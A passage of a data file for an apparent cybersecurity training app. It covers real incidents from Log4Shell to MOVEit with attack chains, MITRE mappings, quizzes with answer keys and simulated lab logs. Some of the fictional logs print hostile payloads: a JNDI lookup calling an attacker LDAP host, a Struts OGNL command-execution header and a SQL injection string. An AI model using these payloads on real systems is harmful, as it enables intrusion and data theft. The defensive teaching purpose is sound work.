    impact: 'Scored maximum CVSS 10.0 severity; affected virtually every major cloud provider (Amazon, Apple, Google, Twitter, Steam).',
    howItWasDetected: 'Security researcher Chen Zhaojun of Alibaba Cloud Security Team reported the vulnerability to the Apache Foundation.',
    whatDefendersCouldHaveDone: 'Disabled JNDI message lookups (LOG4J_FORMAT_MSG_NO_LOOKUPS=true) and restricted outbound server egress to LDAP/RMI ports.',
    mitigations: ['Upgrade to Log4j 2.17.1 or higher', 'Set log4j2.formatMsgNoLookups=true', 'Block outbound LDAP (port 389/636) and RMI (port 1099) at the egress firewall'],
    lessonsForEthicalHackers: 'Deeply buried open-source dependencies in software supply chains can expose massive attack surfaces through routine logging.',
    lessonsForBlueTeam: 'Software Bill of Materials (SBOM) and egress network filtering are essential to stop remote code execution callbacks.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Execution', techniqueId: 'T1059', techniqueName: 'Command and Scripting Interpreter' }
    ],
    relatedSkills: ['Web Security', 'Secure Coding', 'Dependency Management', 'Egress Firewalling'],
    timeline: [
      { stage: 'Disclosure', title: 'Minecraft Proof of Concept', detail: 'Players discover typing JNDI string in game chat triggers server execution.', timestamp: 'Day 1 12:00' },
      { stage: 'Internet Probing', title: 'Mass Scanning', detail: 'Automated scanners blast User-Agent headers across all public IPv4 ranges.', timestamp: 'Day 1 18:00' },
      { stage: 'Exploitation', title: 'Outbound LDAP Callbacks', detail: 'Vulnerable servers reach out to attacker LDAP servers for malicious .class files.', timestamp: 'Day 2 02:00' },
      { stage: 'Emergency Patching', title: 'Global Upgrades', detail: 'CISA issues emergency directive requiring all federal agencies to patch immediately.', timestamp: 'Day 3 14:00' }
    ],
    safeSimulation: {
      labTitle: 'JNDI String Header Injection & Egress Lockdown',
      scenario: 'Inspect web server request logs for JNDI payloads in the User-Agent header and enforce JVM lookup disablement.',
      targetHost: '10.10.10.65 (sim-java-app)',
      fictionalLogs: `10.10.10.180 - - [21/Aug/2026:11:42:01] "GET /login HTTP/1.1" 200 4120 "User-Agent: \${jndi:ldap://10.10.10.180:1389/Exploit}"\n[LOG4J CORE] Initiating JNDI lookup to ldap://10.10.10.180:1389/Exploit\n[NETWORK EGRESS] TCP SYN from 10.10.10.65:48123 -> 10.10.10.180:1389 [BLOCKED BY LOCAL POLICY]`,
      investigationQuestions: [
        {
          question: 'What pattern in the User-Agent header triggers the Log4Shell vulnerability in unpatched Log4j instances?',
          options: ['The string expression "${jndi:ldap://...}"', 'A standard SQL quote character "\'"', 'An HTML "<script>" tag', 'An image filename ending in .png'],
          correctIndex: 0,
          explanation: 'Log4j\'s message lookup substitution engine parsed "${jndi:..." syntax and executed outbound network queries.'
        }
      ],
      remediationTask: 'Set environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true in the service container configuration.',
      verificationCommand: 'export LOG4J_FORMAT_MSG_NO_LOOKUPS=true'
    },
    quiz: {
      question: 'Why was Log4Shell rated the maximum possible CVSS severity score of 10.0?',
      options: ['It required zero authentication, was trivial to execute remotely, affected millions of services, and yielded full remote code execution', 'It only affected Linux laptops', 'It required physical access with a wrench', 'It required administrator credentials'],
      correctIndex: 0,
      explanation: 'Log4Shell was unauthenticated, remotely exploitable via simple text input, ubiquitous across global infrastructure, and granted total server takeover.'
    },
    aiDebrief: {
      discoveryPrompt: 'Which HTTP header was the attacker using to inject the malicious JNDI string?',
      rootCausePrompt: 'Why should logging frameworks never execute dynamic network protocols based on untrusted log strings?',
      evidencePrompt: 'What network connection attempt indicated that the server parsed the lookup string?',
      defensePrompt: 'How does an egress firewall policy blocking outbound LDAP prevent code execution even if unpatched?',
      takeawayPrompt: 'Why is generating an accurate Software Bill of Materials (SBOM) essential for modern organizations?'
    }
  },
  {
    id: 'inc-05',
    name: 'Target Data Breach',
    year: 2013,
    sector: 'Retail & Financial Services',
    incidentType: 'Data Breach',
    difficulty: 'Intermediate',
    whatHappened: 'Attackers stole credit card data for 40 million customers and personal records for 70 million individuals by pivoting from a third-party HVAC vendor.',
    initialAttackVector: 'Phishing email with Citadel malware sent to an employee at Fazio Mechanical Services (third-party HVAC vendor).',
    attackChain: [
      '1. Phishing compromise of third-party vendor credentials',
      '2. Login to Target vendor portal without Multi-Factor Authentication',
      '3. Internal lateral movement across flat unsegmented network to Point-of-Sale (POS) environment',
      '4. Memory scraping malware (Kaptoxa/BlackPOS) installed on cash registers',
      '5. Exfiltration of track 1 and 2 magnetic stripe payment card data'
    ],
    securityWeakness: 'Lack of MFA on vendor access portals and failure to segment the vendor network from the high-security payment card (PCI-DSS) network.',
    whatAttackersAchieved: 'Stole magnetic stripe payment information and personal data for over 110 million shoppers.',
    impact: 'Led to the resignation of Target\'s CEO and CIO, over $200 million in direct breach costs, and accelerated the US adoption of EMV chip cards.',
    howItWasDetected: 'US Department of Justice and card issuers noticed fraudulent transaction spikes originating from Target store locations.',
    whatDefendersCouldHaveDone: 'Enforced MFA on all external vendor logins, isolated the POS network with strict micro-segmentation, and acted on FireEye security alerts.',
    mitigations: ['Enforce MFA for all third-party and remote access', 'Isolate payment environments with network microsegmentation', 'Monitor and respond to security alerting systems'],
    lessonsForEthicalHackers: 'Third-party supply-chain partners with trusted network links are frequently the weakest entry point.',
    lessonsForBlueTeam: 'Alert fatigue and failure to act on automated detection alarms can neutralize even expensive defensive software.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1566.002', techniqueName: 'Phishing: Spearphishing Link' },
      { tactic: 'Collection', techniqueId: 'T1005', techniqueName: 'Data from Local System' },
      { tactic: 'Lateral Movement', techniqueId: 'T1021', techniqueName: 'Remote Services' }
    ],
    relatedSkills: ['Network Segmentation', 'MFA Enforcement', 'Third-Party Risk', 'SOC Alert Triage'],
    timeline: [
      { stage: 'Vendor Phish', title: 'HVAC Vendor Compromised', detail: 'Fazio Mechanical employee clicks phishing link delivering Citadel malware.', timestamp: 'Nov 15' },
      { stage: 'Portal Access', title: 'Vendor Login to Target Portal', detail: 'Attackers log into supplier portal using stolen vendor credentials without MFA.', timestamp: 'Nov 27' },
      { stage: 'Lateral Pivot', title: 'POS Network Infiltration', detail: 'Attackers move across flat network into domain controllers and POS systems.', timestamp: 'Nov 30' },
      { stage: 'RAM Scraping', title: 'Memory Scraping Active', detail: 'Kaptoxa scrapes track 2 card data during payment processing.', timestamp: 'Dec 02' }
    ],
    safeSimulation: {
      labTitle: 'Network Microsegmentation & POS Isolation Audit',
      scenario: 'Audit simulated network routing rules between the vendor DMZ and the payment processing VLAN.',
      targetHost: '10.10.10.80 (sim-pci-router)',
      fictionalLogs: `[ROUTER-AUDIT] VLAN 50 (Vendor-DMZ) -> VLAN 100 (POS-Terminals): ANY ALLOWED (Rule 0)\n[AUTH-LOG] User 'fazio_contractor' logged in from external IP 198.51.100.22 - MFA: DISABLED\n[ENDPOINT-ALERT] Process 'pos_service.exe' memory hooked by unknown thread (PID 2190)`,
      investigationQuestions: [
        {
          question: 'What architectural design flaw permitted vendor accounts to communicate directly with cash registers?',
          options: ['A flat network architecture without VLAN micro-segmentation blocking vendor access to POS subnets', 'Weak Wi-Fi encryption in the cafeteria', 'A DDoS attack on the public website', 'An outdated web browser on the manager PC'],
          correctIndex: 0,
          explanation: 'Target\'s internal network was not properly segmented, allowing lateral movement from contractor portals to payment registers.'
        }
      ],
      remediationTask: 'Apply firewall isolation rule denying all traffic from VLAN 50 to VLAN 100.',
      verificationCommand: 'iptables -I FORWARD -s 10.50.0.0/16 -d 10.100.0.0/16 -j DROP'
    },
    quiz: {
      question: 'How did attackers initially gain access to Target\'s corporate network?',
      options: ['By compromising a third-party HVAC vendor via phishing and using their vendor credentials', 'By guessing the CEO\'s password', 'By planting a rogue router in a store', 'By exploiting an unpatched database on port 3306'],
      correctIndex: 0,
      explanation: 'Attackers phished credentials from Fazio Mechanical Services, an HVAC contractor with portal access.'
    },
    aiDebrief: {
      discoveryPrompt: 'How did attackers pivot from an external supplier portal to internal payment registers?',
      rootCausePrompt: 'Why is Multi-Factor Authentication mandatory for all third-party supplier access portals?',
      evidencePrompt: 'What memory technique did the BlackPOS malware use to steal unencrypted card numbers?',
      defensePrompt: 'How does zero-trust network architecture prevent cross-VLAN lateral movement?',
      takeawayPrompt: 'Why must enterprise security teams prioritize and act on automated EDR alerts?'
    }
  },
  {
    id: 'inc-06',
    name: 'Sony Pictures Attack',
    year: 2014,
    sector: 'Entertainment & Media',
    incidentType: 'Malware',
    difficulty: 'Hard',
    whatHappened: 'A state-sponsored destructive cyber attack by the "Guardians of Peace" (Lazarus Group) wiped thousands of corporate computers and leaked confidential emails and unreleased films.',
    initialAttackVector: 'Targeted spearphishing of Sony IT administrators and corporate executives with malicious documents.',
    attackChain: [
      '1. Spearphishing leading to credential harvesting',
      '2. Internal reconnaissance with mimikatz to dump Domain Admin hashes',
      '3. Months of undetected persistent access and massive data exfiltration (terabytes)',
      '4. Deployment of Destover Master Boot Record (MBR) wiper malware',
      '5. Public extortion and release of private emails and unreleased films'
    ],
    securityWeakness: 'Unencrypted plaintext password spreadsheets, lack of network egress anomaly detection, and vulnerable Active Directory credentials.',
    whatAttackersAchieved: 'Destroyed IT infrastructure, erased hard drives with MBR wiping, leaked private executive emails, and delayed film releases.',
    impact: 'Highlighted the devastating reputational and operational impact of destructive state-sponsored wiper attacks.',
    howItWasDetected: 'Employees arrived at work to find skull defacement images on screens and bricked operating systems.',
    whatDefendersCouldHaveDone: 'Restricted administrative credentials, vaulted sensitive passwords with PAM, and monitored massive outbound data exfiltration.',
    mitigations: ['Deploy Privileged Access Management (PAM)', 'Store secrets in encrypted password managers, never plaintext files', 'Monitor network egress volume for large exfiltration anomalies'],
    lessonsForEthicalHackers: 'Attackers who gain Domain Admin can abuse legitimate system administration tools for total scorched-earth destruction.',
    lessonsForBlueTeam: 'Credential hygiene and segregating admin workstations (PAWs) are vital to containing domain-wide compromise.',
    mitreMapping: [
      { tactic: 'Credential Access', techniqueId: 'T1003', techniqueName: 'OS Credential Dumping' },
      { tactic: 'Impact', techniqueId: 'T1561.002', techniqueName: 'Disk Structure Wipe' }
    ],
    relatedSkills: ['Active Directory Security', 'Privilege Escalation', 'DFIR', 'Credential Hygiene'],
    timeline: [
      { stage: 'Spearphishing', title: 'Executive Compromise', detail: 'Fake LinkedIn job lures deliver malware to Sony sysadmins.', timestamp: 'Month 1' },
      { stage: 'Recon & Staging', title: 'AD Domain Enumeration', detail: 'Mimikatz extracts Domain Admin passwords stored in plaintext.', timestamp: 'Month 2' },
      { stage: 'Exfiltration', title: 'Terabytes Transferred', detail: 'Unreleased films and corporate emails copied to external servers.', timestamp: 'Month 4' },
      { stage: 'Wiper Execution', title: 'Destover MBR Overwrite', detail: 'Malware overwrites disk sectors with 0x00 and displays skull graphic.', timestamp: 'Month 5' }
    ],
    safeSimulation: {
      labTitle: 'Plaintext Credential Exposure & MBR Wiper Triage',
      scenario: 'Audit a simulated network share to identify exposed plaintext credential files and active privileged sessions.',
      targetHost: '10.10.10.90 (sim-ad-share)',
      fictionalLogs: `[FILE-SHARE] Read request: \\\\corp-share\\IT_Admins\\passwords.xlsx by user 'jdoe'\n[SYS-EVENT] EventID 4624: Successful logon for Administrator from workstation WS-12 (mimikatz detected)\n[DISK-ALERT] PhysicalDrive0: Direct raw write to sector 0 (MBR) by process 'igmp.exe'`,
      investigationQuestions: [
        {
          question: 'What dangerous security practice allowed attackers to easily harvest administrative credentials across the company?',
          options: ['Storing administrative passwords in an unencrypted spreadsheet on a shared network drive', 'Using complex 20-character randomized passwords', 'Enforcing mandatory password rotation every 30 days', 'Using hardware security keys'],
          correctIndex: 0,
          explanation: 'Attackers discovered unencrypted spreadsheets containing hundreds of corporate and social media passwords.'
        }
      ],
      remediationTask: 'Remove world-readable permissions from administrative network shares and vault credentials.',
      verificationCommand: 'chmod 700 /shares/it_admin_passwords'
    },
    quiz: {
      question: 'What was the primary destructive mechanism used by the Destover wiper malware in the Sony attack?',
      options: ['Overwriting the Master Boot Record (MBR) and raw disk sectors to make systems unbootable', 'Sending spam emails', 'Turning off the office lights', 'Changing desktop wallpaper only'],
      correctIndex: 0,
      explanation: 'Destover overwrote the MBR and system files, rendering thousands of workstations permanently unbootable.'
    },
    aiDebrief: {
      discoveryPrompt: 'What file discovered on the internal share accelerated the attacker\'s privilege escalation?',
      rootCausePrompt: 'Why must administrative credentials never be stored in plaintext spreadsheets or scripts?',
      evidencePrompt: 'Which event log entry demonstrated unauthorized direct access to raw physical disk sectors?',
      defensePrompt: 'How does Privileged Access Workstations (PAW) architecture prevent credential theft?',
      takeawayPrompt: 'Why is data exfiltration monitoring just as critical as perimeter intrusion detection?'
    }
  },
  {
    id: 'inc-08',
    name: 'NotPetya',
    year: 2017,
    sector: 'Global Logistics, Shipping & Critical Infrastructure',
    incidentType: 'Critical Infrastructure',
    difficulty: 'Master',
    whatHappened: 'A state-sponsored destructive cyber weapon disguised as ransomware spread via a trojanized Ukrainian accounting software update (M.E.Doc), causing over $10 billion in global damage.',
    initialAttackVector: 'Compromise of the M.E.Doc accounting software update server to push malicious update to corporate tax software.',
    attackChain: [
      '1. Upstream supply chain compromise of Ukrainian tax software (M.E.Doc)',
      '2. Automatic installation of backdoor during software update',
      '3. Internal lateral movement via EternalBlue and PsExec using dumped memory credentials',
      '4. Irreversible disk encryption and Master File Table (MFT) destruction',
      '5. Fake ransom note displaying non-functional decryption email address'
    ],
    securityWeakness: 'Unrestricted trust in third-party software updates, unsegmented internal networks, and domain administrator credential reuse.',
    whatAttackersAchieved: 'Paralyzed Maersk global shipping ports, pharmaceutical giant Merck, FedEx/TNT Express, and radiation monitoring at Chernobyl.',
    impact: 'The single most financially costly cyber attack in human history ($10+ billion in direct losses).',
    howItWasDetected: 'Shipping port container cranes and corporate logistics networks froze worldwide simultaneously.',
    whatDefendersCouldHaveDone: 'Isolated accounting software on segregated network segments, restricted PsExec lateral movement, and disabled SMBv1.',
    mitigations: ['Segment accounting and tax software into isolated VLANs', 'Block lateral movement via PsExec and WMI with endpoint firewalls', 'Disable SMBv1 and enforce patch management'],
    lessonsForEthicalHackers: 'Malware disguised as ransomware can actually be a pure wiper with no mathematical possibility of data recovery.',
    lessonsForBlueTeam: 'Active Directory Domain Admin compromise allows automated malware to wipe thousands of servers in minutes.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1195.002', techniqueName: 'Supply Chain Compromise: Software Supply Chain' },
      { tactic: 'Impact', techniqueId: 'T1485', techniqueName: 'Data Destruction' }
    ],
    relatedSkills: ['Supply Chain Security', 'Lateral Movement Defense', 'Active Directory Hardening', 'Incident Response'],
    timeline: [
      { stage: 'Supply Breach', title: 'M.E.Doc Server Hacked', detail: 'Attackers compromise update server for popular Ukrainian tax tool.', timestamp: 'Day 1 10:00' },
      { stage: 'Update Pushed', title: 'Backdoor Executed', detail: 'Update executes payload on thousands of corporate endpoints.', timestamp: 'Day 1 10:30' },
      { stage: 'Rapid Lateral Spread', title: 'PsExec + EternalBlue', detail: 'Wiper sweeps entire corporate networks in under 15 minutes.', timestamp: 'Day 1 11:00' },
      { stage: 'Global Paralysis', title: 'Ports and Logistics Frozen', detail: 'Maersk loses entire IT network across 76 global shipping ports.', timestamp: 'Day 1 12:00' }
    ],
    safeSimulation: {
      labTitle: 'Wiper Disguise Analysis & Lateral Movement Block',
      scenario: 'Inspect disk encryption behavior to distinguish between genuine ransomware and an irreversible wiper.',
      targetHost: '10.10.10.95 (sim-shipping-node)',
      fictionalLogs: `[2026-08-21 12:01:04] Process: rundll32.exe executing M.E.Doc update binary\n[2026-08-21 12:01:05] Kernel: EternalBlue sweep on 10.10.10.0/24 subnet\n[2026-08-21 12:01:06] MFT: Master File Table overwritten with garbage pseudorandom bytes (Key discarded)\n[2026-08-21 12:01:07] System: Hard reboot triggered with fake CHKDSK screen`,
      investigationQuestions: [
        {
          question: 'Why was it impossible for victims of NotPetya to recover their files even if they paid the ransom?',
          options: ['The malware generated a random encryption key and intentionally discarded it without storing or sending it, making it a pure wiper', 'The internet cables were severed', 'The Bitcoin network was offline', 'The hard drives were physically crushed'],
          correctIndex: 0,
          explanation: 'NotPetya was designed as a destructive wiper; the encryption key was permanently erased and never recoverable.'
        }
      ],
      remediationTask: 'Enforce local firewall rules preventing incoming PsExec / SMB administrative shares.',
      verificationCommand: 'iptables -A INPUT -p tcp --dport 445 -s 10.10.10.0/24 -j DROP'
    },
    quiz: {
      question: 'What initial distribution mechanism allowed NotPetya to infect hundreds of multinational corporations in minutes?',
      options: ['A compromised software update for Ukrainian tax accounting program M.E.Doc', 'Spam emails with zip attachments', 'USB drives left in parking lots', 'Cracked video games'],
      correctIndex: 0,
      explanation: 'NotPetya entered multinational enterprises through an automated update for mandatory Ukrainian tax software.'
    },
    aiDebrief: {
      discoveryPrompt: 'What key difference separated NotPetya from standard financial ransomware?',
      rootCausePrompt: 'How did credential caching in memory allow the worm to propagate across entire domains?',
      evidencePrompt: 'Which log entry proved that the Master File Table was intentionally destroyed?',
      defensePrompt: 'How does network microsegmentation prevent a supply chain breach in one country from crippling global ops?',
      takeawayPrompt: 'Why is offline business continuity planning necessary for critical logistics networks?'
    }
  },
  {
    id: 'inc-09',
    name: 'Equifax Data Breach',
    year: 2017,
    sector: 'Credit Reporting & Consumer Finance',
    incidentType: 'Web Application',
    difficulty: 'Intermediate',
    whatHappened: 'Attackers exploited an unpatched Apache Struts vulnerability (CVE-2017-5638) to steal credit profiles, Social Security Numbers, and personal data for 147 million consumers.',
    initialAttackVector: 'OGNL expression injection in the Content-Type HTTP header sent to the Apache Struts dispute portal.',
    attackChain: [
      '1. Scanning for unpatched Apache Struts instances on public web portal',
      '2. Remote code execution via Content-Type header OGNL injection (CVE-2017-5638)',
      '3. Interactive web shell spawned on web server',
      '4. Pivot to internal legacy databases using hardcoded credentials found in server configuration',
      '5. Execution of 9,000 database queries to exfiltrate 147M credit records over 76 days'
    ],
    securityWeakness: 'Failure to apply vendor security patch released 2 months prior; lack of internal database query monitoring.',
    whatAttackersAchieved: 'Exfiltrated names, Social Security numbers, birth dates, and driver\'s license numbers of half the US adult population.',
    impact: 'Equifax agreed to a $700 million settlement with the FTC; highlighted corporate liability for unpatched known vulnerabilities.',
    howItWasDetected: 'Security engineers noticed suspicious outbound network traffic while renewing an expired SSL certificate on an internal packet inspection device.',
    whatDefendersCouldHaveDone: 'Patched Apache Struts immediately following the March 2017 disclosure, monitored database query volumes, and kept SSL inspection certs active.',
    mitigations: ['Implement rapid vulnerability scanning and patch deployment cycles', 'Encrypt databases at rest and monitor bulk query volumes', 'Maintain active TLS decryption sensors on internal networks'],
    lessonsForEthicalHackers: 'A single unpatched public web framework vulnerability can provide direct access to the most sensitive backend databases.',
    lessonsForBlueTeam: 'If network monitoring devices have expired certificates, encrypted malicious traffic can flow unnoticed for months.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Exfiltration', techniqueId: 'T1041', techniqueName: 'Exfiltration Over C2 Channel' }
    ],
    relatedSkills: ['Web Vulnerability Assessment', 'Patch Management', 'Database Security', 'TLS Inspection'],
    timeline: [
      { stage: 'Patch Released', title: 'CVE-2017-5638 Disclosed', detail: 'Apache releases security fix for Struts OGNL vulnerability.', timestamp: 'March 07' },
      { stage: 'Initial Exploit', title: 'Web Shell Dropped', detail: 'Attackers exploit dispute portal via crafted Content-Type header.', timestamp: 'March 10' },
      { stage: 'Data Harvest', title: '9,000 SQL Queries', detail: 'Attackers systematically dump database records over 76 days.', timestamp: 'May - July' },
      { stage: 'Detection', title: 'SSL Cert Renewed', detail: 'Engineers renew inspection cert and observe massive encrypted exfiltration.', timestamp: 'July 29' }
    ],
    safeSimulation: {
      labTitle: 'Content-Type Header OGNL Injection Triage',
      scenario: 'Inspect web server request logs for Apache Struts OGNL expression payloads and apply WAF filtering.',
      targetHost: '10.10.10.105 (sim-struts-portal)',
      fictionalLogs: `10.10.10.220 - - [21/Aug/2026 14:02:11] "POST /dispute/upload.action HTTP/1.1" 200 1420\nContent-Type: %{(#_memberAccess['allowStaticMethodAccess']=true)(#cmd='whoami',#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')),#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))}\n[DB-QUERY] User 'app_user' executed: SELECT ssn, dob, address FROM consumer_records LIMIT 50000;`,
      investigationQuestions: [
        {
          question: 'What component of the HTTP request carried the malicious exploit string?',
          options: ['The Content-Type HTTP request header containing OGNL parser expressions', 'The user\'s password field in HTML', 'The SSL certificate public key', 'The DNS TXT record'],
          correctIndex: 0,
          explanation: 'The Apache Struts vulnerability processed crafted OGNL expressions passed inside the Content-Type header.'
        }
      ],
      remediationTask: 'Block requests containing OGNL parser characters (%{# in HTTP headers at the WAF.',
      verificationCommand: 'grep -E "%\\{#" /var/log/nginx/waf_blocks.log'
    },
    quiz: {
      question: 'Why went the massive data exfiltration undetected at Equifax for over two months?',
      options: ['An internal network traffic inspection device had an expired SSL certificate and was blind to encrypted traffic', 'The attackers worked only on weekends', 'The database had no audit logs', 'The servers were running in airplane mode'],
      correctIndex: 0,
      explanation: 'An expired SSL certificate on an internal network traffic monitor allowed encrypted malicious traffic to pass uninspected for 76 days.'
    },
    aiDebrief: {
      discoveryPrompt: 'What vulnerability parser flaw in Apache Struts allowed arbitrary command execution?',
      rootCausePrompt: 'Why did the gap between patch release and patch deployment prove fatal?',
      evidencePrompt: 'What database query anomaly indicated systematic bulk data exfiltration?',
      defensePrompt: 'How do database activity monitoring (DAM) tools alert on anomalous record export volumes?',
      takeawayPrompt: 'Why is holistic vulnerability management more than just scanning networks?'
    }
  },
  {
    id: 'inc-11',
    name: 'Colonial Pipeline',
    year: 2021,
    sector: 'Energy & Critical Infrastructure',
    incidentType: 'Ransomware',
    difficulty: 'Intermediate',
    whatHappened: 'DarkSide ransomware gang forced the temporary shutdown of the largest refined oil pipeline in the US, causing fuel shortages across the East Coast.',
    initialAttackVector: 'Single compromised VPN credential discovered in a dark web password dump; account lacked Multi-Factor Authentication (MFA).',
    attackChain: [
      '1. Attacker purchases legacy corporate VPN credentials from dark web marketplace',
      '2. Login to corporate VPN network without MFA prompt',
      '3. Internal reconnaissance and deployment of DarkSide ransomware',
      '4. 100GB of sensitive corporate data exfiltrated in 2 hours',
      '5. Precautionary shutdown of OT pipeline operations to prevent lateral bleed'
    ],
    securityWeakness: 'Inactive legacy VPN account left enabled without MFA, lack of IT/OT network segmentation assurance.',
    whatAttackersAchieved: 'Received $4.4 million in Bitcoin ransom (partially recovered by FBI) and halted 2.5 million barrels/day of fuel delivery.',
    impact: 'Led to panic buying, gas station runouts, and White House Executive Order 14028 mandating zero trust and MFA.',
    howItWasDetected: 'An employee in the control room discovered a ransom note on a billing computer at 5:30 AM.',
    whatDefendersCouldHaveDone: 'Decommissioned unused VPN profiles, enforced phishing-resistant MFA on all remote access points.',
    mitigations: ['Enforce MFA across 100% of remote access and VPN endpoints', 'Audit and deactivate dormant and legacy user accounts', 'Strictly decouple IT billing systems from OT pipeline control'],
    lessonsForEthicalHackers: 'A single neglected credential without MFA can compromise an entire national critical infrastructure asset.',
    lessonsForBlueTeam: 'Identity is the new perimeter; legacy accounts that bypass MFA policies represent critical enterprise risks.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1078.002', techniqueName: 'Valid Accounts: Domain Accounts' },
      { tactic: 'Impact', techniqueId: 'T1486', techniqueName: 'Data Encrypted for Impact' }
    ],
    relatedSkills: ['VPN Security', 'Identity & Access Management (IAM)', 'OT/IT Boundary Auditing', 'Ransomware Response'],
    timeline: [
      { stage: 'Credential Leaked', title: 'Dark Web Sale', detail: 'Legacy VPN password leaked in previous third-party breach.', timestamp: 'Day 1' },
      { stage: 'VPN Login', title: 'Single-Factor Access', detail: 'Attacker logs in via Pulse Secure VPN without MFA challenge.', timestamp: 'May 06 20:00' },
      { stage: 'Data Exfil & Lock', title: 'Ransom Note Dropped', detail: '100GB corporate data stolen and billing servers encrypted.', timestamp: 'May 07 05:30' },
      { stage: 'Pipeline Shutdown', title: 'Precautionary Handoff', detail: 'Operators manually shut down pipeline to protect OT control systems.', timestamp: 'May 07 06:00' }
    ],
    safeSimulation: {
      labTitle: 'VPN Legacy Account & MFA Policy Triage',
      scenario: 'Audit active VPN user directories to identify dormant accounts without MFA enforcement.',
      targetHost: '10.10.10.115 (sim-vpn-gateway)',
      fictionalLogs: `[2026-08-21 05:12:01] VPN-AUTH: User 'legacy_contractor' authenticated from 198.51.100.77 - Method: Password-Only (MFA: BYPASSED)\n[2026-08-21 05:12:05] VPN-SESSION: Tunnel established. Internal IP assigned: 10.10.10.244\n[2026-08-21 05:12:10] Netflow: Outbound connection from 10.10.10.244 to mega.nz (100GB exfiltrated)`,
      investigationQuestions: [
        {
          question: 'What simple security control would have completely stopped the initial entry of the DarkSide attackers?',
          options: ['Enforcing Multi-Factor Authentication (MFA) on the VPN gateway', 'Rebooting the server daily', 'Installing a commercial anti-virus on the printer', 'Increasing password length by 1 character'],
          correctIndex: 0,
          explanation: 'MFA requires a second factor (e.g. authenticator app or hardware token), rendering stolen passwords useless.'
        }
      ],
      remediationTask: 'Enforce global MFA requirement and disable dormant accounts in PAM directory.',
      verificationCommand: 'sed -i "s/mfa_required = false/mfa_required = true/" /etc/vpn/auth.conf'
    },
    quiz: {
      question: 'Why did Colonial Pipeline management choose to shut down the physical fuel pipeline even though the ransomware only infected IT billing systems?',
      options: ['They could not accurately bill customers and feared the ransomware might jump the gap into OT control systems', 'The physical pipes were damaged by malware', 'The electricity was turned off', 'The FBI ordered them to destroy the fuel'],
      correctIndex: 0,
      explanation: 'Without functioning billing systems and lacking certainty about IT/OT network isolation, operators shut down the pipeline as a safety precaution.'
    },
    aiDebrief: {
      discoveryPrompt: 'What type of account did the attackers use to gain their initial foothold?',
      rootCausePrompt: 'Why are legacy and forgotten VPN accounts particularly dangerous for enterprise networks?',
      evidencePrompt: 'What network activity accompanied the encryption of the corporate billing environment?',
      defensePrompt: 'How do conditional access policies block logins from unmanaged devices and unusual geographies?',
      takeawayPrompt: 'What does this incident demonstrate about the interdependency of business IT and operational OT?'
    }
  },
  {
    id: 'inc-13',
    name: 'MOVEit Transfer Attacks',
    year: 2023,
    sector: 'Government, Higher Education, Finance & Healthcare',
    incidentType: 'Zero-Day',
    difficulty: 'Hard',
    whatHappened: 'The Cl0p ransomware syndicate exploited a zero-day SQL injection flaw (CVE-2023-34362) in the MOVEit managed file transfer software, stealing data from over 2,700 organizations.',
    initialAttackVector: 'Pre-authenticated SQL injection in the human2.aspx web endpoint of MOVEit Transfer.',
    attackChain: [
      '1. Automated exploitation of SQL injection vulnerability via crafted HTTP POST requests',
      '2. Database manipulation to inject active administrative user sessions',
      '3. Deployment of custom LEMURLOOT web shell disguised as human2_aspx.ashx',
      '4. Bulk extraction of files from Azure Blob / local storage without encrypting the host',
      '5. Mass extortion publishing stolen file directories on dark web leak sites'
    ],
    securityWeakness: 'Zero-day SQL injection in enterprise file transfer software running with administrative database privileges.',
    whatAttackersAchieved: 'Compromised records belonging to over 90 million individuals without ever needing to encrypt victim machines.',
    impact: 'Exemplified the shift from file-encrypting ransomware to pure mass zero-day data exfiltration extortion.',
    howItWasDetected: 'Progress Software identified anomalous file creations (human2.aspx) and published an emergency security advisory on May 31, 2023.',
    whatDefendersCouldHaveDone: 'Restricted public access to file transfer web portals via IP allowlisting or VPN, and deployed WAF signatures.',
    mitigations: ['Apply vendor security updates immediately', 'Disable public internet exposure of managed file transfer servers', 'Monitor for unauthorized .ashx and .aspx web shell file drops'],
    lessonsForEthicalHackers: 'SQL injection flaws in public web interfaces remain one of the most devastating attack vectors when combined with automation.',
    lessonsForBlueTeam: 'Managed file transfer (MFT) appliances are high-value targets and must not be exposed to the public internet without defense-in-depth.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Persistence', techniqueId: 'T1505.003', techniqueName: 'Server Software Component: Web Shell' }
    ],
    relatedSkills: ['SQL Injection', 'Web Shell Hunting', 'MFT Hardening', 'Zero-Day Response'],
    timeline: [
      { stage: 'Zero-Day Tested', title: 'Silent Testing', detail: 'Cl0p tests SQLi payloads against public MOVEit servers.', timestamp: 'May 27' },
      { stage: 'Mass Exploitation', title: 'Automated Harvest', detail: 'Automated bots drop LEMURLOOT web shells on 2,700 servers.', timestamp: 'May 28-30' },
      { stage: 'Advisory Released', title: 'CVE-2023-34362 Disclosed', detail: 'Progress Software releases mitigation guidance and patches.', timestamp: 'May 31' },
      { stage: 'Mass Extortion', title: 'Leak Site Demands', detail: 'Cl0p begins listing victims on dark web leak blog.', timestamp: 'June 14' }
    ],
    safeSimulation: {
      labTitle: 'MFT SQL Injection & Web Shell Hunting',
      scenario: 'Inspect web server directory logs for dropped .ashx files and analyze SQL injection artifacts in the request parameters.',
      targetHost: '10.10.10.125 (sim-moveit-node)',
      fictionalLogs: `10.10.10.235 - - [21/Aug/2026 16:30:01] "POST /moveitisapi/MOVEitISAPI.dll?action=m2 HTTP/1.1" 200 412\n[DB-LOG] Executing query: SELECT * FROM users WHERE Email = 'admin@corp' OR 1=1;--'\n[FILE-MONITOR] New file created: C:\\MOVEitTransfer\\wwwroot\\human2_aspx.ashx\n[HTTP-ACCESS] GET /human2_aspx.ashx?X-siLock-Comment=exfil 200 89410`,
      investigationQuestions: [
        {
          question: 'What file was dropped onto the web server root to serve as a persistent backdoor for downloading stolen files?',
